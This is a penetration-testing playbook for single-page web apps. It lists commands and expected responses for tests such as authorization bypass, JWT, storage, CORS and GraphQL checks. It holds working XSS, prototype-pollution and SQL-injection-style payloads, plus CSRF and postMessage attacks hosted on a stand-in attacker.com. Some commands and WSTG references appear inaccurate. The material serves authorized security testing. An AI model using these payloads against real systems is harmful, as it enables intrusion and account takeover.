# SPA Penetration Testing Playbook

A comprehensive guide to testing React, Angular, and Vue single-page applications for security vulnerabilities. Includes commands, expected responses, and detection patterns.

---

## 1. Client-Side Routing Authorization Bypass

**Test:** Access restricted routes directly via URL manipulation

**Commands:**
```bash
# Try accessing admin routes as low-privilege user
curl -H "Authorization: Bearer <low_priv_token>" https://target.com/api/admin/users

# In browser console, navigate directly to restricted route
window.location.href = "/admin/dashboard"
```

**Expected Response (Vulnerable):**
- Page renders with admin content
- API returns 200 + data
- No redirect to `/unauthorized`

**Expected Response (Secure):**
- 403 Forbidden from API
- Router redirects to `/login` or `/unauthorized`
- API validates token + role server-side

**WSTG Reference:** WSTG 4.2 (Access Control Testing)

---

## 2. JavaScript Bundle Reconnaissance

**Test:** Extract hardcoded secrets, API keys, internal URLs

**Commands:**
```bash
# Download and beautify main bundle
curl https://target.com/static/js/main.abc123.js | python3 -m json.tool

# Search for secrets in DevTools Sources tab (Ctrl+F)
apiKey, api_key, AWS_, STRIPE_, Bearer, password, internal., staging.

# Extract source maps if available
curl https://target.com/static/js/main.abc123.js.map
**Common paths to test:**
- /static/js/main.*.js.map
- /static/js/*.js.map
- /assets/js/app.*.js.map
- /assets/js/*.js.map
- /js/bundle.*.js.map
- /dist/js/main.*.js.map
- /dist/js/*.js.map
- /public/js/*.js.map


# Use webpack-bundle-analyzer
npm install webpack-bundle-analyzer
webpack-bundle-analyzer main.abc123.js

# Automated secret scanning with Semgrep
semgrep --config p/secrets ./src/
```

**Expected Response (Vulnerable):**
- Hardcoded API keys in bundle
- Internal service URLs (e.g., `https://internal-api.company.local`)
- Admin endpoints not documented
- AWS/Stripe credentials
- Private keys or credentials

**Expected Response (Secure):**
- No sensitive values in bundle
- All config loaded from secure endpoint
- Source maps only in staging, not prod
- Environment variables loaded server-side

**WSTG Reference:** WSTG 6.5 (Input Validation)

---

## 3. Client-Side Storage Inspection

**Test:** Check localStorage, sessionStorage, IndexedDB for sensitive data

**Commands:**
```bash
# In browser console
localStorage
sessionStorage
Object.keys(localStorage)
localStorage.getItem('auth_token')

# Check IndexedDB
indexedDB.databases()

# Check for data persistence
# Log in, open DevTools Application tab, inspect all storage

# Clear and test logout
localStorage.clear()
sessionStorage.clear()

# Verify data is actually cleared
Object.keys(localStorage).length  // Should be 0
```

**Expected Response (Vulnerable):**
- Tokens in localStorage (vulnerable to XSS)
- Unencrypted user data
- API responses cached client-side
- Data persists after logout
- PII accessible in DevTools

**Expected Response (Secure):**
- Tokens in httpOnly cookies only
- No PII in client storage
- Data cleared on logout
- Sensitive data server-side only
- Non-essential data only in storage

**WSTG Reference:** WSTG 11.3 (Testing Browser Storage)

---

## 4. DOM-Based XSS Testing

**Test:** Inject payloads into URL parameters, hash fragments, postMessage

**Commands:**
```bash
# URL parameter injection
https://target.com/search?q=<img src=x onerror=alert(1)>

# Hash fragment injection
https://target.com/#section=<svg onload=alert(1)>

# postMessage test (in console)
window.addEventListener('message', function(e) { console.log(e); });
window.postMessage({cmd: 'admin'}, '*');

# Test innerHTML sinks
document.body.innerHTML = '<img src=x onerror=alert(1)>'

# Test various sinks
dangerouslySetInnerHTML={{__html: payload}}
[innerHTML]="userInput"
v-html="userInput"
```

**Expected Response (Vulnerable):**
- Alert fires / JavaScript executes
- Payload appears in DOM without escaping
- postMessage handler executes untrusted commands
- Event handlers fire (onerror, onload, onclick)

**Expected Response (Secure):**
- Payload displayed as text (HTML-escaped)
- CSP blocks inline scripts
- postMessage validates origin + message type
- Dangerous sinks not used or sanitized

**WSTG Reference:** WSTG 11.1 (DOM-Based XSS)

---

## 5. API Authorization Testing

**Test:** Swap tokens between roles, test IDOR on API endpoints

**Commands:**
```bash
# Capture admin request in Burp, swap token for low-priv user
GET /api/admin/users HTTP/1.1
Authorization: Bearer <low_priv_token>

# Test IDOR by modifying ID
GET /api/users/1/profile → GET /api/users/2/profile (swap user ID)

# Test with expired/invalid token
Authorization: Bearer invalid.token.here

# Test without token
curl https://target.com/api/users (no Authorization header)

# Test with null/empty token
Authorization: Bearer null
Authorization:
```

**Expected Response (Vulnerable):**
- 200 OK + data with wrong token/role
- Can access other users' data by ID
- No token validation required
- API trusts client-side role claims
- Works without Authorization header

**Expected Response (Secure):**
- 401 Unauthorized (invalid token)
- 403 Forbidden (insufficient permissions)
- API validates token signature + claims server-side
- IDOR prevention: verify ownership before returning data

**WSTG Reference:** WSTG 4.2 (Access Control Testing), WSTG 6.4 (Authorization Testing)

---

## 6. JWT Vulnerability Testing

**Test:** Token tampering, algorithm confusion, excessive claims

**Commands:**
```bash
# Decode JWT at jwt.io (check expiration, claims, algorithm)
token_parts=$(echo $jwt | tr '.' '\n')

# Extract and decode each part
echo $jwt | cut -d. -f1 | base64 -d | jq .
echo $jwt | cut -d. -f2 | base64 -d | jq .

# Check token expiration
echo $jwt | base64 -d | jq '.exp'

# Check for sensitive data in token
echo $jwt | base64 -d | jq .

# Test with expired token
# (wait for expiration or modify exp claim locally)

# Algorithm confusion test: extract public key and try HS256
# (requires re-signing, complex — skip if RS256 strictly enforced)
```

**Expected Response (Vulnerable):**
- Expired tokens still accepted
- Algorithm confusion accepted (alg: none, alg: HS256)
- Excessive PII in token claims
- Token stored in localStorage (XSS-able)
- No signature validation
- Predictable secret for HS256

**Expected Response (Secure):**
- 401 on expired token
- Signature validation enforces algorithm
- Minimal claims in token (user ID, roles only)
- httpOnly cookie storage
- No PII in claims

**WSTG Reference:** WSTG 4.4 (Session Management Testing)

---

## 7. Client-Side Validation Bypass

**Test:** Intercept requests, remove/modify validation, resend

**Commands:**
```bash
# Intercept form submission in Burp
# Modify required field to empty, re-send
# Example: required="email" removed from input

# Test type confusion
{"amount": "9999"} → {"amount": 9999999}
{"date": "2024-01-01"} → {"date": "2099-01-01"}

# Boundary testing
{"quantity": 1} → {"quantity": -1}
{"quantity": 1} → {"quantity": 99999999}

# Remove validation headers
Content-Type: application/json (remove/change)

# Null injection
{"amount": null}
{"user_id": null}
```

**Expected Response (Vulnerable):**
- Server accepts invalid data
- No re-validation server-side
- Negative/excessive values processed
- Type confusion not caught
- Business logic bypassed

**Expected Response (Secure):**
- 400 Bad Request + validation error
- Server re-validates all input
- Type checking enforced
- Business logic constraints enforced

**WSTG Reference:** WSTG 6.5 (Input Validation)

---

## 8. Insecure postMessage Handling

**Test:** Send malicious postMessage without origin validation

**Commands:**
```bash
# In browser console on page with iframe
window.frames[0].postMessage({malicious: 'payload'}, '*');

# Check if origin is validated
window.addEventListener('message', function(e) {
  console.log(e.origin); // Should be checked against whitelist
});

# Listen to messages received
window.addEventListener('message', (e) => {
  console.log('Origin:', e.origin);
  console.log('Data:', e.data);
});

# Send message from different origin (requires iframe from attacker domain)
# <iframe src="https://attacker.com/payload.html"></iframe>
# Inside payload.html:
# window.parent.postMessage({admin: true}, '*');
```

**Expected Response (Vulnerable):**
- postMessage handler doesn't validate `event.origin`
- Messages from any origin accepted
- DOM manipulation / code execution from untrusted source
- Sensitive data sent without origin restriction

**Expected Response (Secure):**
- `event.origin` validated against whitelist
- Messages only processed from trusted origins
- Message type validation
- Sensitive operations require origin verification

**WSTG Reference:** WSTG 11.8 (Testing for Cross-Window Communication)

---

## 9. Prototype Pollution Testing

**Test:** Inject `__proto__` or `constructor.prototype` to pollute Object.prototype

**Commands:**
```bash
# Test in query parameter
?__proto__[polluted]=true

# Test in JSON body
{"merge": {"__proto__": {"admin": true}}}

# Test constructor variation
?constructor[prototype][polluted]=true

# Check if polluted
({}).polluted // Should be false; vulnerable if true

# Test via merge operation
Object.assign({}, req.body)
Object.assign(config, userInput)

# Test Lodash merge (if available)
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
```

**Expected Response (Vulnerable):**
- `({}).polluted` returns `true`
- Application behavior changes (privilege escalation, XSS)
- Denial of service (infinite loops from polluted properties)
- Authentication bypass (isAdmin becomes true for all users)

**Expected Response (Secure):**
- Prototype pollution blocked
- No property pollution of Object.prototype
- Input sanitization on merge operations
- Recursive merge operations filtered

**WSTG Reference:** WSTG 6.5 (Input Validation)

---

## 10. Feature Flag Abuse

**Test:** Toggle disabled features client-side, check if backend enforces

**Commands:**
```bash
# Modify env.js locally (if exposed)
window.__ENV.REACT_APP_FEATURE_PREMIUM = 'true'

# Or modify localStorage
localStorage.setItem('premium_user', 'true')
localStorage.setItem('feature_flag_admin', 'true')

# Modify Redux/Vuex store directly (if accessible)
store.state.user.isPremium = true

# Check if backend honors the flag or enforces server-side
# Try accessing premium feature API endpoint
curl -H "Authorization: Bearer <token>" https://target.com/api/premium/feature

# Test with modified feature flags in request
curl -X POST -H "Content-Type: application/json" \
  -d '{"feature_flags": {"premium": true}}' \
  https://target.com/api/submit
```

**Expected Response (Vulnerable):**
- Premium feature accessible without payment
- Backend trusts client-side flag
- Feature available to non-paying users
- Admin endpoints accessible to regular users
- Feature state modifiable by client

**Expected Response (Secure):**
- Backend validates feature flag server-side
- API checks user's actual subscription status
- Client-side flag is UI hint only
- Feature availability verified server-side

**WSTG Reference:** WSTG 6.2 (Business Logic Testing)

---

## 11. Sensitive Data in Browser History

**Test:** Check browser history for sensitive identifiers in URL

**Commands:**
```bash
# Check history.state object (in console)
window.history.state

# Check what URLs appear in browser history
# (patient IDs, financial records, tokens in URL)

# Use history.pushState to see what data is stored
window.history.pushState({data: 'test'}, '', '/new-url')

# Navigate through app and check URLs
# Look for: /user/123, /patient/456, /order/789

# Test history manipulation
window.history.back()
window.history.forward()
window.history.go(-1)

# Check if data persists in browser history
# Close and reopen browser, check history menu
```

**Expected Response (Vulnerable):**
- User IDs, patient records, financial data in URL
- Data persists in browser history
- Accessible via history.back() or browser history menu
- Sensitive identifiers visible in URL bar

**Expected Response (Secure):**
- No sensitive identifiers in URL
- Use path-only routing (no query params for IDs)
- State managed in memory, not URL
- Sensitive data never appears in URLs

**WSTG Reference:** WSTG 4.5 (Testing for Session Fixation)

---

## 12. Missing Security Headers

**Test:** Check for CSP, HSTS, X-Frame-Options

**Commands:**
```bash
# Check response headers
curl -I https://target.com

# Look for:
# Content-Security-Policy
# Strict-Transport-Security
# X-Frame-Options
# X-Content-Type-Options
# X-XSS-Protection

# Full header inspection
curl -v https://target.com 2>&1 | grep -i "^<"

# Test CSP bypass (if missing)
# Inject inline script: <script>alert(1)</script>

# Test X-Frame-Options (clickjacking)
# Embed page in iframe: <iframe src="https://target.com"></iframe>

# Test for HTTPS enforcement
curl -I http://target.com (should redirect to https)
```

**Expected Response (Vulnerable):**
- No CSP header (allows inline scripts)
- No HSTS (vulnerable to downgrade)
- No X-Frame-Options (clickjacking possible)
- No X-Content-Type-Options (MIME sniffing)
- Allows HTTP access

**Expected Response (Secure):**
- CSP: `default-src 'self'; script-src 'self'`
- HSTS: `max-age=31536000; includeSubDomains`
- X-Frame-Options: `DENY` or `SAMEORIGIN`
- X-Content-Type-Options: `nosniff`
- HTTPS only

**WSTG Reference:** WSTG 4.6 (Testing for Security Headers)

---

## 13. Lazy-Loaded Module Route Enumeration

**Test:** Discover and test lazy-loaded routes not in initial bundle

**Commands:**
```bash
# Search bundle for route patterns
grep -r "loadChildren\|dynamic\|lazy" main.*.js

# Look for chunk files in Network tab
# When navigating to /admin, watch for chunk loads
# Example: 1.abc123.chunk.js

# Download lazy-loaded chunks
curl https://target.com/static/js/1.abc123.chunk.js

# Test route access
https://target.com/admin/users
https://target.com/settings/profile
https://target.com/reports/export

# Enumerate by common names
for route in admin settings profile reports user dashboard api logs config; do
  curl -H "Authorization: Bearer <token>" https://target.com/api/$route
done
```

**Expected Response (Vulnerable):**
- Access to lazy-loaded admin routes
- Chunks containing sensitive logic
- Routes not in main bundle still exploitable

**Expected Response (Secure):**
- Lazy-loaded routes protected by auth
- API validates access for all routes
- Route guards enforced server-side

**WSTG Reference:** WSTG 4.2 (Access Control Testing)

---

## 14. Third-Party Library Vulnerabilities

**Test:** Find known CVEs in bundled dependencies

**Commands:**
```bash
# Check Retire.js (via npm or browser)
npm install -g retire
retire --jspath ./node_modules

# Automated audit
npm audit
npm audit --json

# Check for specific vulnerable patterns
# Lodash 4.18.1 has prototype pollution CVEs
grep -o "lodash@[0-9.]*" package.json

# Search bundle for vulnerable library usage
grep -i "_.merge\|_.defaultsDeep\|_.template" main.*.js

# Check vulnerable jQuery versions
grep -i "jquery.*1\.[0-5]" main.*.js
```

**Expected Response (Vulnerable):**
- Known CVEs in bundled libraries
- Vulnerable versions of Lodash, jQuery, Angular
- Prototype pollution patterns (Lodash)
- DOM XSS patterns (jQuery)

**Expected Response (Secure):**
- All dependencies up to date
- No known CVEs
- Security patches applied

**WSTG Reference:** WSTG 6.2 (Business Logic Testing)

---

## 15. Service Worker Exploitation

**Test:** Test Service Worker for security issues

**Commands:**
```bash
# Check Application tab > Service Workers
# Look for registered service workers

# In DevTools > Application > Service Workers
# Check: active, waiting, stored, updatefound states

# Test cached responses
# DevTools > Application > Cache Storage
# Check what's cached (should not be sensitive data)

# Test offline functionality
# Toggle offline mode: DevTools > Network > Offline
# Reload page - does cached data load?

# Check service worker code
curl https://target.com/service-worker.js

# Look for sensitive data being cached
# Example: API responses with user data

# Test cache poisoning
# Modify response in cache, reload app
```

**Expected Response (Vulnerable):**
- Sensitive data cached
- No validation of cached responses
- Cache not cleared on logout
- Offline mode serves cached user data

**Expected Response (Secure):**
- Only non-sensitive data cached
- Cache cleared on logout
- No tokens/credentials in cache
- Validation of cached responses

**WSTG Reference:** WSTG 11 (Client-Side Testing)

---

## 16. IndexedDB Inspection

**Test:** Check IndexedDB for sensitive data storage

**Commands:**
```bash
# In DevTools > Application > IndexedDB
# Check all databases and object stores

# In console
indexedDB.databases()

# Open IndexedDB database
const request = indexedDB.open('myAppDB');
request.onsuccess = (e) => {
  const db = e.target.result;
  console.log(db.objectStoreNames); // List all stores
};

# Check stored data
# Look for: user profiles, encrypted tokens, API responses

# Test data persistence
# Log in, check IndexedDB
# Log out, check if data cleared
```

**Expected Response (Vulnerable):**
- Tokens stored in IndexedDB
- Unencrypted user data
- PII in IndexedDB
- Data persists after logout
- Accessible via DevTools

**Expected Response (Secure):**
- No sensitive data in IndexedDB
- Data cleared on logout
- Only non-essential data stored
- Encryption if sensitive data must be stored

**WSTG Reference:** WSTG 11.3 (Testing Browser Storage)

---

## 17. CORS Preflight Bypass (Content-Type Tricks)

**Test:** Test requests that skip CORS preflight checks

**Commands:**
```bash
# Requests without preflight use simple content types:
# application/x-www-form-urlencoded
# text/plain
# multipart/form-data

# Test if JSON API accepts form-encoded
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  --data "data=malicious" https://target.com/api/endpoint

# Test with text/plain
curl -X POST -H "Content-Type: text/plain" \
  -d '{"malicious": "payload"}' https://target.com/api/endpoint

# Test CORS on allowed origins
curl -H "Origin: https://attacker.com" https://target.com/api/endpoint

# Check Access-Control headers
curl -I -H "Origin: https://attacker.com" https://target.com/api/endpoint
```

**Expected Response (Vulnerable):**
- Accepts requests from any origin
- Non-preflight requests processed
- CORS allows credentials
- No origin validation

**Expected Response (Secure):**
- Only whitelisted origins allowed
- CORS properly configured
- Credentials only with matched origin
- Preflight validation

**WSTG Reference:** WSTG 4.3 (CORS Testing)

---

## 18. Error Message Information Leakage

**Test:** Trigger errors to expose stack traces and internal info

**Commands:**
```bash
# Send malformed JSON
curl -X POST -H "Content-Type: application/json" \
  -d 'invalid json' https://target.com/api/endpoint

# Use invalid IDs
curl https://target.com/api/users/invalid_id

# Hit rate limits
for i in {1..100}; do
  curl https://target.com/api/endpoint
done

# Trigger DB errors
curl -X POST -H "Content-Type: application/json" \
  -d '{"user_id": "\" OR 1=1--"}' https://target.com/api/submit

# Check console for error messages
# Look for: stack traces, file paths, DB errors, internal IPs
```

**Expected Response (Vulnerable):**
- Detailed stack traces
- Internal file paths exposed
- Database error messages
- Internal IP addresses
- Unhandled exception details

**Expected Response (Secure):**
- Generic error messages
- No stack traces
- No internal paths
- No database details
- Proper error handling

**WSTG Reference:** WSTG 5.7 (Error Handling Testing)

---

## 19. Source Map Exposure

**Test:** Check if source maps are exposed in production

**Commands:**
```bash
# In Network tab, look for .map files
# Or curl:
curl https://target.com/static/js/main.abc123.js.map

# If .map file exists, download it
curl https://target.com/static/js/main.abc123.js.map > main.map

# Use source-map-consumer or tools to reconstruct source
npm install -g source-map-explorer
source-map-explorer main.abc123.js main.abc123.js.map

# Check sourceMappingURL comment in JS files
grep -o "sourceMappingURL=.*" main.*.js
```

**Expected Response (Vulnerable):**
- Source maps accessible in production
- Full original source code reconstructable
- Secrets visible in source
- Logic flaws visible

**Expected Response (Secure):**
- No source maps in production
- Source maps only in staging/dev
- Or source maps available only to authenticated users

**WSTG Reference:** WSTG 6.5 (Input Validation)

---

## 20. Cookie SameSite Bypass

**Test:** Test weak SameSite cookie policies

**Commands:**
```bash
# In DevTools > Application > Cookies
# Check each cookie's SameSite attribute

# Look for: SameSite=None, or missing SameSite
# Vulnerable: SameSite=None; Secure

# Test CSRF from different domain
# Create HTML on attacker.com:
<img src="https://target.com/api/action?id=123" />

# Test with fetch from cross-origin
fetch('https://target.com/api/sensitive', {
  credentials: 'include', // Includes cookies
  method: 'POST'
})
```

**Expected Response (Vulnerable):**
- SameSite=None or missing
- CSRF requests succeed
- Cross-origin requests include cookies
- No CSRF tokens required

**Expected Response (Secure):**
- SameSite=Strict or Lax
- CSRF tokens required
- Cross-origin requests blocked
- Proper cookie security

**WSTG Reference:** WSTG 4.3 (CORS Testing)

---

## 21. Timing Attack on Auth Checks

**Test:** Detect auth validation timing leaks

**Commands:**
```bash
# Time responses for valid vs. invalid tokens
time curl -H "Authorization: Bearer valid_token" https://target.com/api/admin
time curl -H "Authorization: Bearer invalid_token" https://target.com/api/admin

# Use Apache Bench for repeated timing
ab -n 100 -c 1 \
  -H "Authorization: Bearer invalid_token" \
  https://target.com/api/admin

# If timing differs significantly, there's a side-channel leak
# Valid tokens might take longer (more validation)
# Or invalid tokens might take longer (more error handling)
```

**Expected Response (Vulnerable):**
- Response time differs based on token validity
- Side-channel reveals token information
- Timing attack possible

**Expected Response (Secure):**
- Consistent response times
- No timing side-channels
- Timing attack resistance

**WSTG Reference:** WSTG 4.4 (Session Management Testing)

---

## 22. Input Fuzzing on API Parameters

**Test:** Fuzz API parameters with unexpected types/formats

**Commands:**
```bash
# Fuzz with jq or custom script
for type in "null" "true" "false" "[]" "{}" '""' "0" "-1" "999999999" "1.5"; do
  echo "Testing with: $type"
  curl -X POST -H "Content-Type: application/json" \
    -d "{\"amount\": $type}" https://target.com/api/submit
done

# Fuzz string parameters
for payload in "" " " "null" "undefined" "NaN" "Infinity"; do
  curl "https://target.com/api/search?q=$payload"
done

# Fuzz with special characters
for char in "\\" "'" "\"" "`" "{" "}" "[" "]"; do
  curl "https://target.com/api/search?q=$char"
done
```

**Expected Response (Vulnerable):**
- Type confusion bugs
- Crashes or 500 errors
- Unexpected behavior
- Negative values accepted
- String parameters break parsing

**Expected Response (Secure):**
- Type validation enforced
- Graceful error handling
- Consistent responses
- Input validation catches edge cases

**WSTG Reference:** WSTG 6.5 (Input Validation)

---

## 23. Race Conditions in State Management

**Test:** Test for race conditions with concurrent API calls

**Commands:**
```bash
# Send two conflicting API requests simultaneously
curl -X PUT /api/user/balance --data '{"amount": -100}' &
curl -X PUT /api/user/balance --data '{"amount": -100}' &
wait

# Check final balance (should not be double-deducted)

# Test with rapid requests
for i in {1..10}; do
  curl -X POST /api/action --data '{"amount": 1}' &
done
wait

# Check if all requests processed correctly
# Or if some were lost/duplicated

# Test with form submission and double-click
# Intercept first request, then send second before response
```

**Expected Response (Vulnerable):**
- Both deductions applied (negative balance bug)
- Double-spending possible
- Inconsistent state
- Lost updates

**Expected Response (Secure):**
- Idempotent requests
- Locks/transactions prevent race conditions
- Consistent state maintained
- Duplicate detection

**WSTG Reference:** WSTG 6.6 (Race Condition Testing)

---

## 24. GraphQL Introspection (if using GraphQL)

**Test:** Check if GraphQL introspection is enabled

**Commands:**
```bash
# Test introspection query
curl -X POST -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name}}}"}' \
  https://target.com/api/graphql

# Get full schema
curl -X POST -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name,type{name}}}}}"}' \
  https://target.com/api/graphql

# If introspection is enabled, you get:
# - All types and fields
# - Query/Mutation definitions
# - Field arguments and types
# - Full API surface map

# Use Apollo GraphQL CLI to fetch schema
apollo schema:download --endpoint=https://target.com/api/graphql
```

**Expected Response (Vulnerable):**
- Introspection enabled
- Full schema publicly available
- All queries/mutations visible
- No authentication required
- Easy attack surface mapping

**Expected Response (Secure):**
- Introspection disabled
- Requires authentication
- Schema not publicly available
- Limited field visibility

**WSTG Reference:** WSTG 6.5 (Input Validation)

---

## Quick Reference by Vulnerability Type

### **HIGH Priority Tests**
- [ ] Client-Side Routing Authorization Bypass (#1)
- [ ] API Authorization Testing (#5)
- [ ] DOM-Based XSS (#4)
- [ ] CSV Formula Injection (if file upload)
- [ ] Prototype Pollution (#9)

### **MEDIUM Priority Tests**
- [ ] JavaScript Bundle Reconnaissance (#2)
- [ ] JWT Vulnerability Testing (#6)
- [ ] Feature Flag Abuse (#10)
- [ ] Broken Access Control (#5)

### **LOW Priority Tests**
- [ ] Client-Side Storage (#3)
- [ ] Missing Security Headers (#12)
- [ ] Nginx Version Disclosure
- [ ] CORS Misconfiguration

### **Advanced Tests**
- [ ] Service Worker Exploitation (#15)
- [ ] IndexedDB Inspection (#16)
- [ ] GraphQL Introspection (#24)
- [ ] Race Conditions (#23)
- [ ] Timing Attacks (#21)

---

## Tools Required

**Essential:**
- Burp Suite Pro (with browser)
- Chrome DevTools
- curl / wget
- Text editor

**Recommended:**
- Retire.js (library CVE scanning)
- Semgrep (static analysis)
- webpack-bundle-analyzer (bundle inspection)
- source-map-explorer (source map analysis)

---

## Common Vulnerable Patterns

### React
- `dangerouslySetInnerHTML` with user input
- `eval()` on user-supplied data
- Unvalidated route parameters
- Tokens in localStorage

### Angular
- `[innerHTML]` binding without sanitization
- `bypassSecurityTrustHtml()` misuse
- Missing DomSanitizer
- Lazy-loaded module route bypasses

### Vue
- `v-html` directive with user input
- Unescaped `{{ }}` bindings
- postMessage without origin validation
- Feature flags checked client-side only

---

## References

- OWASP Testing Guide v4.2
- OWASP Top 10 2021
- PortSwigger Web Security Academy
- CWE Top 25
- Strobes SPA Pentesting Guide

